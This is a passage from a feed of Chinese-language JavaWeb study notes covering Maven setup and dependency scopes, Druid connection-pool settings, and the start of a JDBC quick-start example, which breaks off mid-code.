stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><ul><li>项目对象模型 (Project Object Model)</li><li>依赖管理模型 (Dependency)</li><li>插件 (Plugin)</li></ul></blockquote><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622204621330.png" alt="image-20220622204621330"></p><ul><li>仓库分类<ul><li>本地仓库：自己计算机上的目录</li><li>中央仓库：由 Maven 团队维护的全球唯一的仓库<ul><li>地址：<a href="https://repo1.maven.org/maven2/">https://repo1.maven.org/maven2/</a></li></ul></li><li>远程仓库：一般由公司团队搭建的私有仓库</li></ul></li><li>写了一个依赖后 Maven 会先到本地仓库找，本地仓库如果没有会去中央仓库找，中央仓库找到之后会将这个依赖 jar 包下载到本地仓库，如果架设了私服，会先到私服找，私服再找不到然后去中央仓库找</li></ul><h1 id="3-maven安装与配置"><a class="markdownIt-Anchor" href="#3-maven安装与配置">#</a> 3、Maven 安装与配置</h1><ol><li>解压 apache-maven 即为安装完成</li><li>配置环境变量 MAVEN-HOME 为安装路径的 bin 目录</li><li>配置本地仓库：修改 conf/settings.xml 中的 &lt;localRepository&gt; 为一个指定目录</li><li>配置阿里云私服：修改 conf/settings.xml 中的 &lt;mirrors&gt; 标签，为其添加如下子标签</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;mirror&gt;&lt;id&gt;alimaven&lt;&#x2F;id&gt;&lt;name&gt;aliyun maven&lt;&#x2F;name&gt;&lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt;&lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;&lt;&#x2F;mirror&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-maven的基本使用"><a class="markdownIt-Anchor" href="#4-maven的基本使用">#</a> 4、Maven 的基本使用</h1><h2 id="41-maven常用命令"><a class="markdownIt-Anchor" href="#41-maven常用命令">#</a> 4.1 Maven 常用命令</h2><ul><li><p>compile：编译</p></li><li><p>clean：清理</p></li><li><p>test：测试</p></li><li><p>package：打包</p></li><li><p>install：安装</p></li></ul><h2 id="42-maven生命周期"><a class="markdownIt-Anchor" href="#42-maven生命周期">#</a> 4.2 Maven 生命周期</h2><ul><li>Maven 构建项目生命周期描述的是一次构建过程经历了多少事件</li><li>Maven 对项目构建的生命周期划分为 3 套<ul><li>clean：清理工作</li><li>default：核心工作，例如编译、测试、打包、安装等</li><li>site：产生报告，发布站点等</li></ul></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623061028050.png" alt="image-20220623061028050"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623061136036.png" alt="image-20220623061136036"></p><h1 id="5-idea配置maven"><a class="markdownIt-Anchor" href="#5-idea配置maven">#</a> 5、IDEA 配置 Maven</h1><h2 id="51-idea配置maven环境"><a class="markdownIt-Anchor" href="#51-idea配置maven环境">#</a> 5.1 IDEA 配置 Maven 环境</h2><p>我们需要先在 IDEA 中配置 Maven 环境：</p><ul><li><p>选择 IDEA 中 File --&gt; Settings</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726174202898.png" alt="image-20210726174202898" style="zoom:80%;" /></li><li><p>搜索 maven</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726174229396.png" alt="image-20210726174229396" style="zoom:80%;" /></li><li><p>设置 IDEA 使用本地安装的 Maven，并修改配置文件路径</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726174248050.png" alt="image-20210726174248050" style="zoom:70%;" /></li></ul><h2 id="52-maven坐标详解"><a class="markdownIt-Anchor" href="#52-maven坐标详解">#</a> 5.2 Maven 坐标详解</h2><p><strong>什么是坐标？</strong></p><ul><li>Maven 中的坐标是<mark>资源的唯一标识</mark></li><li>使用坐标来定义项目或引入项目中需要的依赖</li></ul><p><strong>Maven 坐标主要组成</strong></p><ul><li>groupId：定义当前 Maven 项目隶属组织名称（通常是域名反写，例如：com.itheima）</li><li>artifactId：定义当前 Maven 项目名称（通常是模块名称，例如 order-service、goods-service）</li><li>version：定义当前项目版本号</li></ul><p>如下图就是使用坐标表示一个项目：</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726174718176.png" alt="image-20210726174718176"></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><mark>注意：</mark></p><ul><li>上面所说的资源可以是插件、依赖、当前项目。</li><li>我们的项目如果被其他的项目依赖时，也是需要坐标来引入的。</li></ul></blockquote><h2 id="53-创建maven项目"><a class="markdownIt-Anchor" href="#53-创建maven项目">#</a> 5.3 创建 Maven 项目</h2><p>File-&gt;Project Structure-&gt;Modules-&gt;±&gt;New module</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623062518499.png" alt="image-20220623062518499"></p><h2 id="54-导入maven项目"><a class="markdownIt-Anchor" href="#54-导入maven项目">#</a> 5.4 导入 Maven 项目</h2><p>大家在学习时可能需要看老师的代码，当然也就需要将老师的代码导入到自己的 IDEA 中。我们可以通过以下步骤进行项目的导入：</p><ul><li><p>选择右侧 Maven 面板，点击 + 号</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726182702336.png" alt="image-20210726182702336" style="zoom:70%;" /></li><li><p>选中对应项目的 pom.xml 文件，双击即可</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726182648891.png" alt="image-20210726182648891" style="zoom:70%;" /></li></ul><p><strong>配置 Maven-Helper 插件</strong></p><ul><li><p>选择 IDEA 中 File --&gt; Settings</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726192212026.png" alt="image-20210726192212026" style="zoom:80%;" /></li><li><p>选择 Plugins</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726192224914.png" alt="image-20210726192224914" style="zoom:80%;" /></li><li><p>搜索 Maven，选择第一个 Maven Helper，点击 Install 安装，弹出面板中点击 Accept</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726192244567.png" alt="image-20210726192244567" style="zoom:80%;" /></li><li><p>重启 IDEA</p></li></ul><p>安装完该插件后可以通过 选中项目右键进行相关命令操作，如下图所示：</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726192430371.png" alt="image-20210726192430371" style="zoom:80%;" /><h1 id="6-依赖管理"><a class="markdownIt-Anchor" href="#6-依赖管理">#</a> 6、依赖管理</h1><h2 id="61-使用坐标引入jar包"><a class="markdownIt-Anchor" href="#61-使用坐标引入jar包">#</a> 6.1  使用坐标引入 jar 包</h2><p><strong>使用坐标引入 jar 包的步骤：</strong></p><ul><li><p>在项目的 pom.xml 中编写 <dependencies> 标签</p></li><li><p>在 <dependencies> 标签中 使用 <dependency> 引入坐标</p></li><li><p>定义坐标的 groupId，artifactId，version</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193105765.png" alt="image-20210726193105765" style="zoom:70%;" /></li><li><p>点击刷新按钮，使坐标生效</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193121384.png" alt="image-20210726193121384" style="zoom:60%;" /></li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>注意：</p><ul><li>具体的坐标我们可以到如下网站进行搜索</li><li><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></li></ul></blockquote><p><strong>快捷方式导入 jar 包的坐标：</strong></p><p>每次需要引入 jar 包，都去对应的网站进行搜索是比较麻烦的，接下来给大家介绍一种快捷引入坐标的方式</p><ul><li><p>在 pom.xml 中 按 alt + insert，选择 Dependency</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193603724.png" alt="image-20210726193603724" style="zoom:60%;" /></li><li><p>在弹出的面板中搜索对应坐标，然后双击选中对应坐标</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193625229.png" alt="image-20210726193625229" style="zoom:60%;" /></li><li><p>点击刷新按钮，使坐标生效</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193121384.png" alt="image-20210726193121384" style="zoom:60%;" /></li></ul><p><strong>自动导入设置：</strong></p><p>上面每次操作都需要点击刷新按钮，让引入的坐标生效。当然我们也可以通过设置让其自动完成</p><ul><li><p>选择 IDEA 中 File --&gt; Settings</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193854438.png" alt="image-20210726193854438" style="zoom:60%;" /></li><li><p>在弹出的面板中找到 Build Tools</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193909276.png" alt="image-20210726193909276" style="zoom:80%;" /></li><li><p>选择 Any changes，点击 ok 即可生效</p></li></ul><h2 id="62-依赖范围"><a class="markdownIt-Anchor" href="#62-依赖范围">#</a> 6.2  依赖范围</h2><p>通过设置坐标的依赖范围 (scope)，可以设置 对应 jar 包的作用范围：编译环境、测试环境、运行环境。</p><p>如下图所示给  <code>junit</code>  依赖通过  <code>scope</code>  标签指定依赖的作用范围。 那么这个依赖就只能作用在测试环境，其他环境下不能使用。</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726194703845.png" alt="image-20210726194703845" style="zoom:70%;" /><p>那么  <code>scope</code>  都可以有哪些取值呢？</p><table><thead><tr><th><strong>依赖范围</strong></th><th>编译 classpath</th><th>测试 classpath</th><th>运行 classpath</th><th>例子</th></tr></thead><tbody><tr><td><strong>compile</strong></td><td>Y</td><td>Y</td><td>Y</td><td>logback</td></tr><tr><td><strong>test</strong></td><td>-</td><td>Y</td><td>-</td><td>Junit</td></tr><tr><td><strong>provided</strong></td><td>Y</td><td>Y</td><td>-</td><td>servlet-api</td></tr><tr><td><strong>runtime</strong></td><td>-</td><td>Y</td><td>Y</td><td>jdbc 驱动</td></tr><tr><td><strong>system</strong></td><td>Y</td><td>Y</td><td>-</td><td>存储在本地的 jar 包</td></tr></tbody></table><ul><li>compile ：作用于编译环境、测试环境、运行环境。</li><li>test ： 作用于测试环境。典型的就是 Junit 坐标，以后使用 Junit 时，都会将 scope 指定为该值</li><li>provided ：作用于编译环境、测试环境。我们后面会学习  <code>servlet-api</code>  ，在使用它时，必须将  <code>scope</code>  设置为该值，不然运行时就会报错</li><li>runtime  ： 作用于测试环境、运行环境。jdbc 驱动一般将  <code>scope</code>  设置为该值，当然不设置也没有任何问题</li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>注意：</p><ul><li>如果引入坐标不指定  <code>scope</code>  标签时，默认就是 compile  值。以后大部分 jar 包都是使用默认值。</li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-maven概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-maven概述&quot;&gt;#&lt;/a&gt; 1、Maven 概述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Maven 是专门用于管理和构建 Java 项目的工具，它的主要功能有：
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>druid配置详解</title>
    <link href="http://example.com/post/druid%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3.html"/>
    <id>http://example.com/post/druid%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3.html</id>
    <published>2022-06-22T12:57:50.000Z</published>
    <updated>2022-06-22T13:02:42.991Z</updated>
    
    <content type="html"><![CDATA[<h3 id="druid配置详解"><a class="markdownIt-Anchor" href="#druid配置详解">#</a> druid 配置详解</h3><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">说明</th><th style="text-align:center">建议值</th></tr></thead><tbody><tr><td style="text-align:center">url</td><td style="text-align:center">数据库的 jdbc 连接地址。一般为连接 oracle/mysql。示例如下：</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">mysql : jdbc:mysql://ip:port/dbname?option1&amp;option2&amp;…</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">oracle : jdbc:oracle:thin:@ip:port:oracle_sid</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">username</td><td style="text-align:center">登录数据库的用户名</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">password</td><td style="text-align:center">登录数据库的用户密码</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">initialSize</td><td style="text-align:center">启动程序时，在连接池中初始化多少个连接</td><td style="text-align:center">10-50 已足够</td></tr><tr><td style="text-align:center">maxActive</td><td style="text-align:center">连接池中最多支持多少个活动会话</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">maxWait</td><td style="text-align:center">程序向连接池中请求连接时，超过 maxWait 的值后，认为本次请求失败，即连接池</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">没有可用连接，单位毫秒，设置 - 1 时表示无限等待</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">minEvictableIdleTimeMillis</td><td style="text-align:center">池中某个连接的空闲时长达到 N 毫秒后，连接池在下次检查空闲连接时，将</td><td style="text-align:center">见说明部分</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">回收该连接，要小于防火墙超时设置</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">net.netfilter.nf_conntrack_tcp_timeout_established 的设置</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">timeBetweenEvictionRunsMillis</td><td style="text-align:center">检查空闲连接的频率，单位毫秒，非正整数时表示不进行检查</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">keepAlive</td><td style="text-align:center">程序没有 close 连接且空闲时长超过 minEvictableIdleTimeMillis, 则会执</td><td style="text-align:center">true</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">行 validationQuery 指定的 SQL, 以保证该程序连接不会池 kill 掉，其范围不超</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">过 minIdle 指定的连接个数。</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">minIdle</td><td style="text-align:center">回收空闲连接时，将保证至少有 minIdle 个连接.</td><td style="text-align:center">与 initialSize 相同</td></tr><tr><td style="text-align:center">removeAbandoned</td><td style="text-align:center">要求程序从池中 get 到连接后，N 秒后必须 close, 否则 druid 会强制回收该</td><td style="text-align:center">false, 当发现程序有未</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">连接，不管该连接中是活动还是空闲，以防止进程不会进行 close 而霸占连接。</td><td style="text-align:center">正常 close 连接时设置为 true</td></tr><tr><td style="text-align:center">removeAbandonedTimeout</td><td style="text-align:center">设置 druid 强制回收连接的时限，当程序从池中 get 到连接开始算起，超过此</td><td style="text-align:center">应大于业务运行最长时间</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">值后，druid 将强制回收该连接，单位秒。</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">logAbandoned</td><td style="text-align:center">当 druid 强制回收连接后，是否将 stack trace 记录到日志中</td><td style="text-align:center">true</td></tr><tr><td style="text-align:center">testWhileIdle</td><td style="text-align:center">当程序请求连接，池在分配连接时，是否先检查该连接是否有效。(高效)</td><td style="text-align:center">true</td></tr><tr><td style="text-align:center">validationQuery</td><td style="text-align:center">检查池中的连接是否仍可用的 SQL 语句，drui 会连接到数据库执行该 SQL, 如果</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">正常返回，则表示连接可用，否则表示连接不可用</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">testOnBorrow</td><td style="text-align:center">程序 <strong>申请</strong> 连接时，进行连接有效性检查（低效，影响性能）</td><td style="text-align:center">false</td></tr><tr><td style="text-align:center">testOnReturn</td><td style="text-align:center">程序 <strong>返还</strong> 连接时，进行连接有效性检查（低效，影响性能）</td><td style="text-align:center">false</td></tr><tr><td style="text-align:center">poolPreparedStatements</td><td style="text-align:center">缓存通过以下两个方法发起的 SQL:</td><td style="text-align:center">true</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">public PreparedStatement prepareStatement(String sql)</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">public PreparedStatement prepareStatement(String sql,</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">int resultSetType, int resultSetConcurrency)</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">maxPoolPrepareStatementPerConnectionSize</td><td style="text-align:center">每个连接最多缓存多少个 SQL</td><td style="text-align:center">20</td></tr><tr><td style="text-align:center">filters</td><td style="text-align:center">这里配置的是插件，常用的插件有:</td><td style="text-align:center">stat,wall,slf4j</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">监控统计: filter:stat</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">日志监控: filter:log4j 或者 slf4j</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">防御 SQL 注入: filter:wall</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">connectProperties</td><td style="text-align:center">连接属性。比如设置一些连接池统计方面的配置。</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center">比如设置一些数据库连接属性:</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><h3 id="配置示例"><a class="markdownIt-Anchor" href="#配置示例">#</a> 配置示例</h3><pre class="line-numbers language-none"><code class="language-none">driverClassName&#x3D;com.mysql.jdbc.Driverurl&#x3D;jdbc:mysql:&#x2F;&#x2F;&#x2F;db3?useSSL&#x3D;false&amp;useServerPrepStmts&#x3D;trueusername&#x3D;rootpassword&#x3D;root#初始化连接数量initialSize&#x3D;5#最大连接数maxActive&#x3D;10#最大等待时间maxWait&#x3D;3000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;druid配置详解&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#druid配置详解&quot;&gt;#&lt;/a&gt; druid 配置详解&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;属</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-JDBC</title>
    <link href="http://example.com/post/JavaWeb-JDBC.html"/>
    <id>http://example.com/post/JavaWeb-JDBC.html</id>
    <published>2022-06-22T12:55:59.000Z</published>
    <updated>2022-06-22T12:56:50.878Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-jdbc简介"><a class="markdownIt-Anchor" href="#1-jdbc简介">#</a> 1、JDBC 简介</h1><ul><li><p>JDBC 概念</p><ul><li>JDBC 就是使用 Java 语言操作关系型数据库的一套 API</li><li>全称：（Java DataBase Connectivity）Java 数据库连接</li></ul></li><li><p>JDBC 本质：</p><ul><li>官方（Sun 公司）定义的一套操作所有关系型数据库的规则，即接口</li><li>各个数据库厂商去实现这套接口，提供数据库驱动 jar 包</li><li>我们可以使用这套接口（JDBC）编程，真正执行的代码是驱动 jar 包中的实现类</li></ul></li><li><p>JDBC 好处：</p><ul><li>各数据库厂商使用相同的接口，Java 代码不需要针推不同数据库分别开发</li><li>可随时替换底层数据库，访问数据库的 Java 代码基本不变</li></ul></li></ul><h1 id="2-jdbc快速入门"><a class="markdownIt-Anchor" href="#2-jdbc快速入门">#</a> 2、JDBC 快速入门</h1><h2 id="21-步骤"><a class="markdownIt-Anchor" href="#21-步骤">#</a> 2.1 步骤</h2><ol start="0"><li><p>创建工程，导入驱动 jar 包</p></li><li><p>注册驱动</p></li><li><p>获取连接</p></li><li><p>定义 SQL 语句</p></li><li><p>获取执行 SQL 对象</p></li><li><p>执行 SQL</p></li><li><p>处理返回结果</p></li><li><p>释放资源</p></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>jdbc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DriverManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Statement</span></span><span class="token punctuation">;</span><span class="token comment">/** * 快速入门 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1. 注册驱动</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2. 获取连接</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3306/db3"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3. 定义SQL语句</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"UPDATE ACCOUNT SET MONEY = 2000 WHERE ID = 1"</span><span class="token punctuation">;</span>        <span class="token comment">//4. 获取执行SQL的对象 statement</span>        <span class="token class-name">Statement</span> stmt <span class="token 